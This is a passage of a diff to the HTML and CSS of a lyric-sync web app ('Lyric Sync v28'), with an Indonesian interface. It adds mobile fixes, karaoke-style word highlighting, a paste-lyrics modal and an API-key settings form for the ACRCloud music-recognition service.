@@ -3,10 +3,16 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Lyric Sync </title>
-<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;800&family=DM+Serif+Display&family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet">
+<title>Lyric Sync v28</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;800&family=DM+Serif+Display&display=swap" rel="stylesheet">
 <style>
+
+/* --- MOBILE & UI FIXES --- */
+.mic-btn { width: 90px !important; height: 90px !important; touch-action: manipulation; -webkit-tap-highlight-color: transparent; }
+.lyric-scroll-area { height: 60vh !important; }
+#vizCanvas { width: 100%; max-width: 300px; height: 60px; }
 /* ── THEMES ── */
+
 :root {
   --bg: #07080f;
   --surface: #0d0e1e;
@@ -23,8 +29,6 @@
   --glow-accent2: rgba(123,97,255,0.15);
   --lyric-active-bg: rgba(200,241,53,0.07);
   --lyric-active-shadow: 0 0 32px rgba(200,241,53,0.35);
-  --orb1: rgba(123,97,255,0.12);
-  --orb2: rgba(200,241,53,0.07);
 }
 
 * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -35,13 +39,12 @@ body {
   font-family: var(--display);
   min-height: 100vh;
   overflow-x: hidden;
-  transition: background 0.4s, color 0.4s;
 }
 
 /* ── Ambient background ── */
-.bg-orb { position: fixed; border-radius: 50%; pointer-events: none; z-index: 0; filter: blur(90px); transition: opacity 1.5s ease; }
-.bg-orb-1 { width: 500px; height: 500px; background: radial-gradient(circle, var(--accent2), transparent 70%); top: -180px; right: -160px; opacity: 1; }
-.bg-orb-2 { width: 360px; height: 360px; background: radial-gradient(circle, var(--accent), transparent 70%); bottom: -80px; left: -80px; opacity: 1; }
+.bg-orb { position: fixed; border-radius: 50%; pointer-events: none; z-index: 0; filter: blur(90px); }
+.bg-orb-1 { width: 500px; height: 500px; background: radial-gradient(circle, var(--accent2), transparent 70%); top: -180px; right: -160px; }
+.bg-orb-2 { width: 360px; height: 360px; background: radial-gradient(circle, var(--accent), transparent 70%); bottom: -80px; left: -80px; }
 body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.025'/%3E%3C/svg%3E"); pointer-events: none; }
 
 .app { position: relative; z-index: 1; max-width: 780px; margin: 0 auto; padding: 2rem 1.5rem 4rem; }
@@ -62,7 +65,6 @@ body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-ima
 /* ── Mic section ── */
 .listen-section { display: flex; flex-direction: column; align-items: center; gap: 1rem; margin-bottom: 1.5rem; }
 .mic-ring-outer { position: relative; width: 100px; height: 100px; display: flex; align-items: center; justify-content: center; }
-.mic-ring { position: absolute; inset: 0; border-radius: 50%; border: 1.5px solid transparent; transition: all 0.3s; }
 .mic-btn { width: 80px; height: 80px; border-radius: 50%; border: 1.5px solid var(--border); background: var(--card); cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all 0.25s; outline: none; position: relative; z-index: 1; }
 .mic-btn:hover { border-color: var(--accent); transform: scale(1.05); }
 .mic-btn.active { border-color: var(--danger); background: rgba(255,79,109,0.1); box-shadow: 0 0 0 12px rgba(255,79,109,0.07), 0 0 0 24px rgba(255,79,109,0.03); }
@@ -70,7 +72,6 @@ body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-ima
 .mic-btn.active svg { stroke: var(--danger); }
 .mic-btn:not(.active) svg { stroke: var(--muted); }
 
-/* ── Real Visualizer Canvas ── */
 .visualizer-wrap { display: none; }
 .visualizer-wrap.visible { display: block; }
 #vizCanvas { display: block; width: 240px; height: 40px; border-radius: 10px; }
@@ -83,7 +84,6 @@ body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-ima
 .reidentify-fill { height: 100%; background: var(--accent2); width: 0%; transition: width 1s linear; }
 #reidentifyCountdown { color: var(--accent2); font-weight: 700; min-width: 24px; }
 
-/* ── Spinner ── */
 .spinner { display: none; margin: 1.5rem auto; width: 26px; height: 26px; border: 2px solid var(--border); border-top-color: var(--accent); border-radius: 50%; animation: spin 0.7s linear infinite; }
 .spinner.visible { display: block; }
 @keyframes spin { to { transform: rotate(360deg); } }
@@ -92,7 +92,7 @@ body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-ima
 @keyframes fadeDown { from{opacity:0;transform:translateY(-4px)} to{opacity:1;transform:translateY(0)} }
 
 /* ── Song card ── */
-.song-card { background: var(--card); border: 0.5px solid var(--border); border-radius: 18px; padding: 1rem 1.25rem; display: none; gap: 1rem; align-items: center; margin-bottom: 1rem; backdrop-filter: blur(12px); transition: border-color 0.3s; }
+.song-card { background: var(--card); border: 0.5px solid var(--border); border-radius: 18px; padding: 1rem 1.25rem; display: none; gap: 1rem; align-items: center; margin-bottom: 1rem; backdrop-filter: blur(12px); }
 .song-card.visible { display: flex; animation: fadeDown 0.25s ease; }
 .song-card.playing { border-color: rgba(200,241,53,0.2); }
 .song-art { width: 52px; height: 52px; border-radius: 12px; background: linear-gradient(135deg, var(--accent2), var(--accent)); display: flex; align-items: center; justify-content: center; font-size: 22px; flex-shrink: 0; overflow: hidden; }
@@ -135,10 +135,10 @@ body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-ima
 .progress-labels { display: flex; justify-content: space-between; margin-top: 6px; font-size: 11px; font-family: var(--mono); color: var(--muted); }
 
 /* ── Lyric stage ── */
-.lyric-stage { min-height: 300px; max-height: 400px; background: var(--surface); border: 0.5px solid var(--border); border-radius: 22px; padding: 0; position: relative; display: none; transition: border-color 0.3s, background 0.4s; }
+.lyric-stage { min-height: 300px; max-height: 400px; background: var(--surface); border: 0.5px solid var(--border); border-radius: 22px; padding: 0; position: relative; display: none; }
 .lyric-stage.visible { display: block; animation: fadeDown 0.3s ease; }
 .lyric-stage.paused  { border-color: rgba(123,97,255,0.4); }
-.lyric-scroll-area { height: 400px; overflow-y: auto; padding: 2.5rem 1.75rem 2rem; scrollbar-width: thin; scrollbar-color: rgba(255,255,255,0.07) transparent; -webkit-mask-image: linear-gradient(to bottom, transparent 0%, black 10%, black 90%, transparent 100%); mask-image: linear-gradient(to bottom, transparent 0%, black 10%, black 90%, transparent 100%); -webkit-overflow-scrolling: touch; touch-action: pan-y; }
+.lyric-scroll-area { height: 400px; overflow-y: auto; padding: 2.5rem 1.75rem 2rem; scrollbar-width: thin; -webkit-mask-image: linear-gradient(to bottom, transparent 0%, black 10%, black 90%, transparent 100%); mask-image: linear-gradient(to bottom, transparent 0%, black 10%, black 90%, transparent 100%); -webkit-overflow-scrolling: touch; touch-action: pan-y; }
 .lyric-scroll-area::-webkit-scrollbar { width: 4px; }
 .lyric-scroll-area::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.07); border-radius: 4px; }
 
@@ -151,13 +151,39 @@ body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-ima
 .lyric-line.prev { color: rgba(240,240,248,0.26); font-size: 16px; }
 .lyric-line.active { color: var(--accent); font-size: 24px; font-weight: 800; background: var(--lyric-active-bg); text-shadow: var(--lyric-active-shadow); }
 .lyric-line.next { color: rgba(240,240,248,0.45); font-size: 18px; }
+.lyric-line.active .wl { text-shadow: none; }
+.lyric-line .wl { color: var(--muted); }
+.lyric-line.active .wl.wl-done { color: var(--accent); text-shadow: 0 0 10px rgba(200,241,53,0.5), 0 0 2px rgba(200,241,53,0.3); }
+.lyric-line.active .wl.wl-active { color: #ffffff; text-shadow: 0 0 12px rgba(255,255,255,0.9), 0 0 24px rgba(200,241,53,0.55), 0 0 4px rgba(255,255,255,1); transform: scale(1.1) translateY(-1px); }
 .lyric-sub { font-size: 12px; font-family: var(--mono); color: var(--muted); opacity: 0.7; margin-top: 2px; display: block; font-weight: 400; }
 .lyric-line.active .lyric-sub { color: var(--accent2); opacity: 0.8; }
 
-.jump-btn { display: none; position: absolute; bottom: 12px; left: 50%; transform: translateX(-50%); background: var(--accent); color: var(--bg); font-size: 11px; font-family: var(--mono); font-weight: 700; padding: 5px 14px; border-radius: 20px; cursor: pointer; border: none; animation: fadeDown 0.2s ease; z-index: 10; white-space: nowrap; }
+.wl {
+  display: inline-block;
+  transition: color 0.15s ease, text-shadow 0.15s ease, transform 0.15s ease;
+  will-change: color, text-shadow, transform;
+  transform-origin: center bottom;
+  color: var(--muted);
+  text-shadow: none;
+}
+
+.wl.wl-done {
+  color: var(--accent);
+  text-shadow: 0 0 10px rgba(200, 241, 53, 0.5), 0 0 2px rgba(200, 241, 53, 0.3);
+}
+
+.wl.wl-active {
+  color: #ffffff;
+  text-shadow: 0 0 12px rgba(255, 255, 255, 0.9), 0 0 24px rgba(200, 241, 53, 0.55), 0 0 4px rgba(255, 255, 255, 1);
+  transform: scale(1.1) translateY(-1px);
+}
+
+.wl-space { display: inline; color: inherit; }
+.lyric-line:not(.active) .wl { opacity: 0.55; transform: none !important; text-shadow: none !important; }
+
+.jump-btn { display: none; position: absolute; bottom: 12px; left: 50%; transform: translateX(-50%); background: var(--accent); color: var(--bg); font-size: 11px; font-family: var(--mono); font-weight: 700; padding: 5px 14px; border-radius: 20px; cursor: pointer; border: none; z-index: 10; white-space: nowrap; }
 .jump-btn.visible { display: block; }
 
-/* ── No lyrics ── */
 .no-lyrics { text-align: center; padding: 2.5rem 1rem; display: none; }
 .no-lyrics.visible { display: block; }
 .no-lyrics p { color: var(--muted); font-size: 13px; font-family: var(--mono); }
@@ -166,7 +192,7 @@ body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-ima
 .manual-section { margin-top: 1.75rem; padding-top: 1.25rem; border-top: 0.5px solid var(--border); }
 .manual-label { font-size: 11px; font-family: var(--mono); color: var(--muted); letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 0.6rem; }
 .manual-row { display: flex; gap: 8px; flex-wrap: wrap; }
-.manual-input { flex: 1; min-width: 120px; background: var(--card); border: 0.5px solid var(--border); border-radius: 10px; padding: 9px 12px; color: var(--text); font-family: var(--mono); font-size: 13px; outline: none; transition: border-color 0.2s; }
+.manual-input { flex: 1; min-width: 120px; background: var(--card); border: 0.5px solid var(--border); border-radius: 10px; padding: 9px 12px; color: var(--text); font-family: var(--mono); font-size: 13px; outline: none; }
 .manual-input:focus { border-color: var(--accent2); }
 .manual-input::placeholder { color: var(--muted); }
 .manual-btn { background: var(--accent); color: var(--bg); border: none; border-radius: 10px; padding: 9px 18px; font-family: var(--mono); font-size: 12px; font-weight: 700; cursor: pointer; transition: opacity 0.2s; }
@@ -187,19 +213,18 @@ body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-ima
 .fav-remove:hover { color: var(--danger); }
 .fav-empty { font-size: 12px; font-family: var(--mono); color: var(--muted); text-align: center; padding: 1rem; }
 .fav-export-row { display: flex; gap: 8px; margin-top: 10px; }
-.fav-action-btn { flex: 1; font-size: 11px; font-family: var(--mono); background: var(--card); border: 0.5px solid var(--border); border-radius: 8px; padding: 6px; cursor: pointer; color: var(--muted); transition: all 0.15s; text-align: center; }
+.fav-action-btn { flex: 1; font-size: 11px; font-family: var(--mono); background: var(--card); border: 0.5px solid var(--border); border-radius: 8px; padding: 6px; cursor: pointer; color: var(--muted); text-align: center; }
 .fav-action-btn:hover { border-color: var(--accent); color: var(--accent); }
 
 /* ── Keyboard hints ── */
 .keyboard-hint { margin-top: 1.25rem; padding: 10px 14px; background: var(--card); border: 0.5px solid var(--border); border-radius: 12px; display: flex; gap: 8px; flex-wrap: wrap; }
-.key-item { font-size: 11px; font-family: var(--mono); color: var(--muted); display: flex; align-items: center; gap: 6px; background: var(--surface); border: 0.5px solid var(--border); border-radius: 8px; padding: 7px 11px; cursor: pointer; transition: all 0.15s; user-select: none; -webkit-tap-highlight-color: transparent; touch-action: manipulation; }
+.key-item { font-size: 11px; font-family: var(--mono); color: var(--muted); display: flex; align-items: center; gap: 6px; background: var(--surface); border: 0.5px solid var(--border); border-radius: 8px; padding: 7px 11px; cursor: pointer; transition: all 0.15s; user-select: none; }
 .key-item:hover, .key-item:active { border-color: var(--accent); color: var(--accent); background: rgba(200,241,53,0.06); }
 .key-item.no-action { cursor: default; opacity: 0.5; }
-.key-item.no-action:hover, .key-item.no-action:active { border-color: var(--border); color: var(--muted); background: var(--surface); }
-.key { background: rgba(255,255,255,0.06); border: 0.5px solid var(--border); border-radius: 5px; padding: 2px 7px; color: rgba(240,240,248,0.55); font-size: 11px; }
+.key { background: rgba(255,255,255,0.06); border: 0.5px solid var(--border); border-radius: 5px; padding: 2px 7px; font-size: 11px; }
 
 /* ── Debug panel ── */
-.debug-panel { display: none; margin-top: 1.5rem; background: rgba(10,10,20,0.9); border: 0.5px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 12px 14px; font-family: var(--mono); font-size: 11px; animation: fadeDown 0.2s ease; }
+.debug-panel { display: none; margin-top: 1.5rem; background: rgba(10,10,20,0.9); border: 0.5px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 12px 14px; font-family: var(--mono); font-size: 11px; }
 .debug-panel.visible { display: block; }
 .debug-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
 .debug-title { color: rgba(200,241,53,0.5); letter-spacing: 0.1em; text-transform: uppercase; }
@@ -216,110 +241,192 @@ body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-ima
 .fullscreen-overlay.active { display: flex; }
 .fullscreen-overlay::before {
   content: ''; position: absolute; inset: 0; pointer-events: none;
-  background:
-    radial-gradient(ellipse 70% 35% at 50% 0%, rgba(123,97,255,0.2) 0%, transparent 70%),
-    radial-gradient(ellipse 50% 25% at 50% 100%, rgba(200,241,53,0.08) 0%, transparent 60%);
+  background: radial-gradient(ellipse 70% 35% at 50% 0%, rgba(123,97,255,0.2) 0%, transparent 70%),
+              radial-gradient(ellipse 50% 25% at 50% 100%, rgba(200,241,53,0.08) 0%, transparent 60%);
 }
 
-.fs-song-info {
-  position: relative; z-index: 1;
-  text-align: center;
-  padding: 3.5rem 2rem 2rem;
-  width: 100%;
-  flex-shrink: 0;
-}
-.fs-title {
-  font-size: clamp(24px, 4.5vw, 44px);
-  font-weight: 800;
-  background: linear-gradient(135deg, #ffffff 0%, var(--accent) 55%, var(--accent2) 100%);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  background-clip: text;
-  letter-spacing: -0.015em;
-  line-height: 1.1;
-}
-.fs-artist {
-  font-size: clamp(11px, 1.8vw, 16px);
-  font-family: var(--mono);
-  color: var(--accent2);
-  margin-top: 10px;
-  letter-spacing: 0.18em;
-  text-transform: uppercase;
-  opacity: 0.9;
-}
-
-.fs-divider {
-  width: 40px; height: 1.5px;
-  background: linear-gradient(90deg, transparent, var(--accent2), transparent);
-  margin: 0 auto 0;
-  flex-shrink: 0;
-  position: relative; z-index: 1;
-}
-
-.fs-lyrics {
-  position: relative; z-index: 1;
-  width: 100%; max-width: 860px;
-  text-align: center;
-  padding: 0 2.5rem;
-  flex: 1;
-  display: flex; flex-direction: column;
-  align-items: center; justify-content: center;
-  gap: 1rem;
-}
-.fs-prev {
-  font-size: clamp(14px, 2vw, 20px);
-  color: rgba(240,240,248,0.2);
-  transition: all 0.4s ease;
-  line-height: 1.4;
-}
-.fs-active {
-  font-size: clamp(28px, 5.5vw, 58px);
-  font-weight: 800;
-  color: var(--accent);
-  text-shadow: 0 0 40px rgba(200,241,53,0.55), 0 0 90px rgba(200,241,53,0.18);
-  transition: all 0.3s ease;
-  min-height: 1.3em;
-  line-height: 1.2;
-  letter-spacing: -0.01em;
-}
-.fs-sub {
-  font-size: clamp(13px, 2vw, 20px);
-  color: var(--accent2);
-  font-family: var(--mono);
-  opacity: 0.85;
-  letter-spacing: 0.03em;
-}
-.fs-next {
-  font-size: clamp(14px, 2vw, 22px);
-  color: rgba(240,240,248,0.3);
-  transition: all 0.4s ease;
-  line-height: 1.4;
-}
-
-.fs-wm {
-  position: fixed; top: 1.1rem; left: 1.25rem;
-  font-size: 11px; font-family: var(--mono);
-  color: rgba(200,241,53,0.5);
-  letter-spacing: 0.15em;
-  text-transform: uppercase;
-  pointer-events: none;
-  z-index: 2001;
-}
-.fs-hint {
-  position: fixed; bottom: 1.25rem; right: 1.5rem;
-  font-size: 10px; font-family: var(--mono);
-  color: rgba(240,240,248,0.12);
-  letter-spacing: 0.08em;
-}
+.fs-song-info { position: relative; z-index: 1; text-align: center; padding: 3.5rem 2rem 2rem; width: 100%; flex-shrink: 0; }
+.fs-title { font-size: clamp(24px, 4.5vw, 44px); font-weight: 800; background: linear-gradient(135deg, #ffffff 0%, var(--accent) 55%, var(--accent2) 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; letter-spacing: -0.015em; line-height: 1.1; }
+.fs-artist { font-size: clamp(11px, 1.8vw, 16px); font-family: var(--mono); color: var(--accent2); margin-top: 10px; letter-spacing: 0.18em; text-transform: uppercase; opacity: 0.9; }
+.fs-divider { width: 40px; height: 1.5px; background: linear-gradient(90deg, transparent, var(--accent2), transparent); margin: 0 auto; flex-shrink: 0; position: relative; z-index: 1; }
+.fs-lyrics { position: relative; z-index: 1; width: 100%; max-width: 860px; text-align: center; padding: 0 2.5rem; flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 1rem; }
+.fs-prev { font-size: clamp(14px, 2vw, 20px); color: rgba(240,240,248,0.2); transition: all 0.4s ease; line-height: 1.4; }
+.fs-active { font-size: clamp(28px, 5.5vw, 58px); font-weight: 800; color: var(--accent); text-shadow: 0 0 40px rgba(200,241,53,0.55), 0 0 90px rgba(200,241,53,0.18); transition: all 0.3s ease; min-height: 1.3em; line-height: 1.2; letter-spacing: -0.01em; }
+.fs-sub { font-size: clamp(13px, 2vw, 20px); color: var(--accent2); font-family: var(--mono); opacity: 0.85; letter-spacing: 0.03em; }
+.fs-next { font-size: clamp(14px, 2vw, 22px); color: rgba(240,240,248,0.3); transition: all 0.4s ease; line-height: 1.4; }
+.fs-hint { position: fixed; bottom: 1.25rem; right: 1.5rem; font-size: 10px; font-family: var(--mono); color: rgba(240,240,248,0.12); letter-spacing: 0.08em; }
 .fs-progress { position: fixed; bottom: 0; left: 0; right: 0; height: 2px; background: rgba(255,255,255,0.04); }
 .fs-progress-fill { height: 100%; background: linear-gradient(90deg, var(--accent2), var(--accent)); width: 0%; transition: width 0.3s linear; box-shadow: 0 0 10px rgba(200,241,53,0.6); }
+
+/* ── Settings button ── */
+.settings-btn { width: 28px; height: 28px; border-radius: 8px; border: 0.5px solid var(--border); background: var(--card); cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 14px; transition: all 0.15s; color: var(--muted); }
+.settings-btn:hover { border-color: var(--accent); color: var(--accent); }
+
+/* ── Settings modal ── */
+.settings-overlay { display: none; position: fixed; inset: 0; z-index: 3000; background: rgba(7,8,15,0.85); backdrop-filter: blur(8px); align-items: center; justify-content: center; padding: 1rem; }
+.settings-overlay.active { display: flex; animation: fadeDown 0.2s ease; }
+.settings-modal { background: var(--card); border: 0.5px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 1.5rem; width: 100%; max-width: 480px; position: relative; }
+.settings-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 1.25rem; }
+.settings-title { font-size: 13px; font-family: var(--mono); color: var(--accent); letter-spacing: 0.15em; text-transform: uppercase; }
+.settings-close { background: none; border: 0.5px solid var(--border); border-radius: 6px; color: var(--muted); font-family: var(--mono); font-size: 11px; padding: 4px 10px; cursor: pointer; transition: all 0.15s; }
+.settings-close:hover { border-color: var(--danger); color: var(--danger); }
+.settings-section { margin-bottom: 1.25rem; }
+.settings-section-label { font-size: 10px; font-family: var(--mono); color: var(--muted); letter-spacing: 0.15em; text-transform: uppercase; margin-bottom: 0.6rem; opacity: 0.6; }
+.settings-field { margin-bottom: 0.6rem; }
+.settings-field label { font-size: 11px; font-family: var(--mono); color: var(--muted); display: block; margin-bottom: 4px; }
+.settings-input { width: 100%; background: var(--surface); border: 0.5px solid var(--border); border-radius: 8px; padding: 8px 11px; color: var(--text); font-family: var(--mono); font-size: 12px; outline: none; }
+.settings-input:focus { border-color: var(--accent2); }
+.settings-input.key-hidden { -webkit-text-security: disc; }
+.settings-row { display: flex; gap: 8px; align-items: center; margin-bottom: 0.6rem; }
+.settings-select { flex: 1; background: var(--surface); border: 0.5px solid var(--border); border-radius: 8px; padding: 8px 11px; color: var(--text); font-family: var(--mono); font-size: 12px; outline: none; cursor: pointer; }
+.settings-toggle-pw { background: none; border: 0.5px solid var(--border); border-radius: 6px; color: var(--muted); font-family: var(--mono); font-size: 10px; padding: 4px 8px; cursor: pointer; white-space: nowrap; }
+.settings-toggle-pw:hover { border-color: var(--accent2); color: var(--accent2); }
+.settings-save { width: 100%; background: var(--accent); color: var(--bg); border: none; border-radius: 10px; padding: 10px; font-family: var(--mono); font-size: 12px; font-weight: 700; cursor: pointer; margin-top: 0.5rem; }
+.settings-save:hover { opacity: 0.85; }
+.settings-hint { font-size: 10px; font-family: var(--mono); color: rgba(240,240,248,0.25); margin-top: 4px; line-height: 1.5; }
+.settings-warn { font-size: 11px; font-family: var(--mono); color: var(--danger); background: rgba(255,79,109,0.08); border: 0.5px solid rgba(255,79,109,0.2); border-radius: 8px; padding: 8px 10px; margin-bottom: 1rem; display: none; }
+.settings-warn.visible { display: block; }
+.settings-success { font-size: 11px; font-family: var(--mono); color: var(--accent); background: rgba(200,241,53,0.06); border: 0.5px solid rgba(200,241,53,0.2); border-radius: 8px; padding: 8px 10px; margin-bottom: 1rem; display: none; }
+.settings-success.visible { display: block; animation: fadeDown 0.2s ease; }
+
+.resync-btn { background: none; border: 0.5px solid var(--border); border-radius: 8px; color: var(--muted); font-family: var(--mono); font-size: 11px; padding: 4px 10px; cursor: pointer; white-space: nowrap; }
+.resync-btn:hover { border-color: var(--accent2); color: var(--accent2); }
+.resync-btn.spinning { border-color: var(--accent2); color: var(--accent2); animation: spinIcon 0.7s linear infinite; }
+@keyframes spinIcon { to { transform: rotate(360deg); } }
+
+.autosync-toast { display: none; position: fixed; bottom: 80px; left: 50%; transform: translateX(-50%); background: rgba(7,8,15,0.92); border: 0.5px solid var(--accent2); border-radius: 20px; padding: 6px 16px; font-family: var(--mono); font-size: 11px; color: var(--accent2); z-index: 500; white-space: nowrap; backdrop-filter: blur(8px); }
+.autosync-toast.visible { display: block; animation: fadeDown 0.2s ease; }
+
+.font-size-row { display: flex; align-items: center; gap: 8px; padding: 0 1rem; margin-top: 4px; }
+.font-size-label { font-family: var(--mono); font-size: 10px; color: var(--muted); white-space: nowrap; opacity: 0.5; }
+.font-size-slider { flex: 1; -webkit-appearance: none; appearance: none; height: 2px; background: var(--border); border-radius: 2px; outline: none; }
+.font-size-slider::-webkit-slider-thumb { -webkit-appearance: none; width: 14px; height: 14px; background: var(--accent2); border-radius: 50%; cursor: pointer; }
+
+.sync-warn-badge { display: none; font-size: 10px; font-family: var(--mono); color: #ffb300; background: rgba(255,179,0,0.08); border: 0.5px solid rgba(255,179,0,0.25); border-radius: 20px; padding: 3px 10px; margin-left: 6px; }
+.sync-warn-badge.visible { display: inline-block; }
+
+.paste-lyrics-btn { font-size: 11px; font-family: var(--mono); background: none; border: 0.5px solid var(--border); border-radius: 8px; padding: 5px 12px; cursor: pointer; color: var(--muted); }
+.paste-lyrics-btn:hover { border-color: var(--accent2); color: var(--accent2); }
+.paste-lyrics-hint { font-size: 10px; font-family: var(--mono); color: rgba(240,240,248,0.18); margin-left: 8px; }
+
+.paste-overlay { display: none; position: fixed; inset: 0; z-index: 3000; background: rgba(7,8,15,0.88); backdrop-filter: blur(8px); align-items: center; justify-content: center; padding: 1rem; }
+.paste-overlay.active { display: flex; animation: fadeDown 0.2s ease; }
+.paste-modal { background: var(--card); border: 0.5px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 1.5rem; width: 100%; max-width: 520px; display: flex; flex-direction: column; gap: 12px; }
+.paste-header { display: flex; align-items: center; justify-content: space-between; }
+.paste-title { font-size: 13px; font-family: var(--mono); color: var(--accent2); letter-spacing: 0.15em; text-transform: uppercase; }
+.paste-close { background: none; border: 0.5px solid var(--border); border-radius: 6px; color: var(--muted); font-family: var(--mono); font-size: 11px; padding: 4px 10px; cursor: pointer; }
+.paste-close:hover { border-color: var(--danger); color: var(--danger); }
+.paste-row { display: flex; gap: 8px; }
+.paste-input { flex: 1; background: var(--surface); border: 0.5px solid var(--border); border-radius: 8px; padding: 8px 11px; color: var(--text); font-family: var(--mono); font-size: 12px; outline: none; }
+.paste-input:focus { border-color: var(--accent2); }
+.paste-textarea { width: 100%; min-height: 200px; background: var(--surface); border: 0.5px solid var(--border); border-radius: 10px; padding: 10px 12px; color: var(--text); font-family: var(--mono); font-size: 12px; line-height: 1.7; outline: none; resize: vertical; }
+.paste-textarea:focus { border-color: var(--accent2); }
+.paste-hint { font-size: 10px; font-family: var(--mono); color: rgba(240,240,248,0.25); line-height: 1.6; }
+.paste-hint strong { color: var(--accent2); }
+.paste-actions { display: flex; gap: 8px; }
+.paste-submit { flex: 1; background: var(--accent2); color: #fff; border: none; border-radius: 10px; padding: 10px; font-family: var(--mono); font-size: 12px; font-weight: 700; cursor: pointer; }
+.paste-submit:hover { opacity: 0.85; }
+.paste-cancel { background: none; border: 0.5px solid var(--border); border-radius: 10px; padding: 10px 16px; font-family: var(--mono); font-size: 12px; color: var(--muted); cursor: pointer; }
+
+.micadv-bar { display: none; align-items: center; gap: 10px; background: rgba(123,97,255,0.08); border: 0.5px solid rgba(123,97,255,0.25); border-radius: 12px; padding: 8px 14px; margin-bottom: 0.75rem; }
+.micadv-bar.visible { display: flex; animation: fadeDown 0.2s ease; }
+.micadv-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--accent2); box-shadow: 0 0 8px var(--accent2); animation: pulse 1s infinite; flex-shrink: 0; }
+.micadv-text { font-size: 11px; font-family: var(--mono); color: var(--accent2); flex: 1; }
+.micadv-sens { display: flex; align-items: center; gap: 6px; }
+.micadv-sens-label { font-size: 10px; font-family: var(--mono); color: var(--muted); }
+.micadv-slider { width: 70px; -webkit-appearance: none; appearance: none; height: 2px; background: var(--border); border-radius: 2px; outline: none; }
+.micadv-slider::-webkit-slider-thumb { -webkit-appearance: none; width: 12px; height: 12px; background: var(--accent2); border-radius: 50%; cursor: pointer; }
+.micadv-next-btn { font-size: 11px; font-family: var(--mono); background: rgba(123,97,255,0.15); border: 0.5px solid rgba(123,97,255,0.35); border-radius: 8px; padding: 4px 10px; color: var(--accent2); cursor: pointer; white-space: nowrap; }
+.micadv-next-btn:hover { background: rgba(123,97,255,0.25); }
+
 </style>
 </head>
 <body>
 <div class="bg-orb bg-orb-1"></div>
 <div class="bg-orb bg-orb-2"></div>
 
-<!-- Fullscreen Overlay -->
+<div class="autosync-toast" id="autosyncToast">⟳ auto-resyncing...</div>
+
+<div class="paste-overlay" id="pasteOverlay">
+  <div class="paste-modal">
+    <div class="paste-header">
+      <span class="paste-title">✎ paste lirik manual</span>
+      <button class="paste-close" onclick="closePasteLyrics()">✕ close</button>
+    </div>
+    <div class="paste-row">
+      <input class="paste-input" id="pasteArtist" placeholder="artist (opsional)" oninput="checkPasteSaved()" />
+      <input class="paste-input" id="pasteTitle" placeholder="judul lagu (opsional)" oninput="checkPasteSaved()" />
+    </div>
+    <div id="pasteRestoreNotice" style="display:none;font-size:11px;font-family:var(--mono);color:var(--accent);background:rgba(200,241,53,0.06);border:0.5px solid rgba(200,241,53,0.2);border-radius:8px;padding:7px 11px;line-height:1.5"></div>
+    <textarea class="paste-textarea" id="pasteLyricText" placeholder="Paste lirik di sini, satu baris per baris...
+
+Contoh:
+Dalam sepi aku menunggu
+Tak ada yang tahu betapa rindunya
+Kau pergi tanpa kata
+..."></textarea>
+    <div class="paste-hint">
+      💡 Setelah paste, aktifkan mic → lirik akan <strong>auto-advance mengikuti suara</strong>. Klik baris lirik untuk pindah manual.
+    </div>
+    <div class="paste-actions">
+      <button class="paste-cancel" onclick="showPasteHistory()" title="Lirik yang pernah dipaste sebelumnya">📚</button>
+      <button class="paste-cancel" onclick="closePasteLyrics()">batal</button>
+      <button class="paste-submit" onclick="submitPasteLyrics()">▶ pakai lirik ini</button>
+    </div>
+    <div id="pasteHistoryList" style="display:none;margin-top:4px;max-height:160px;overflow-y:auto;border:0.5px solid var(--border);border-radius:10px;background:var(--surface)"></div>
+  </div>
+</div>
+
+<div class="settings-overlay" id="settingsOverlay">
+  <div class="settings-modal">
+    <div class="settings-header">
+      <span class="settings-title">⚙ api settings</span>
+      <button class="settings-close" onclick="closeSettings()">✕ close</button>
+    </div>
+    <div class="settings-warn" id="settingsWarn"></div>
+    <div class="settings-success" id="settingsSuccess">✓ Settings saved!</div>
+    <div class="settings-section">
+      <div class="settings-section-label">ACRCloud</div>
+      <div class="settings-hint" style="margin-bottom:8px">Daftar <strong style="color:var(--accent)">GRATIS</strong> di acrcloud.com → My Projects → Create Project.</div>
+      <div class="settings-field">
+        <label>Access Key</label>
+        <div class="settings-row">
+          <input class="settings-input key-hidden" id="settingsAcrKey" placeholder="ACR Access Key" />
+          <button class="settings-toggle-pw" onclick="togglePw('settingsAcrKey', this)">show</button>
+        </div>
+      </div>
+      <div class="settings-field">
+        <label>Access Secret</label>
+        <div class="settings-row">
+          <input class="settings-input key-hidden" id="settingsAcrSecret" placeholder="ACR Access Secret" />
